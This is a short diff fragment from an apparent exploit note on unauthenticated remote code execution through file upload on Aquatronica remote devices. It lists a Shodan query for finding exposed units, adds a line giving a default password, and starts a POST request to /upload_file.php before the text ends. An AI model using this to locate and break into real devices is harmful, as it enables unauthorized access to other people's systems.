@@ -2,6 +2,7 @@ Unauthenticated RCE via fileupload on aquatronica remote shiet
 
 Shodan: http.favicon.hash:1860999631
 
+Also the default password is : aquatronica 
 
 
 POST /upload_file.php HTTP/1.1
